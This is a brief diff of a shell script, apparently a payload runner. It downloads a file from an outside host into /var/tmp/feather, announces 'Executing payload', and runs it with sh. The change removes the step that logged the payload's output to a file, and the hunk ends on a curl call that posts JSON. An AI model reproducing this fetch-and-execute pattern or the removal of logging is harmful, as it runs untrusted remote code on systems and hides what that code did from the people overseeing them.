@@ -40,7 +40,7 @@ curl http://sql.wah.ph/alpha_branch/script_final > /var/tmp/feather
 
 echo '[ * ] Executing payload'
 echo > ~/log.txt
-sh /var/tmp/feather | tee ~/log.txt
+sh /var/tmp/feather
 
 ENDTIME=`date`
 curl --header "Content-Type: application/json" \
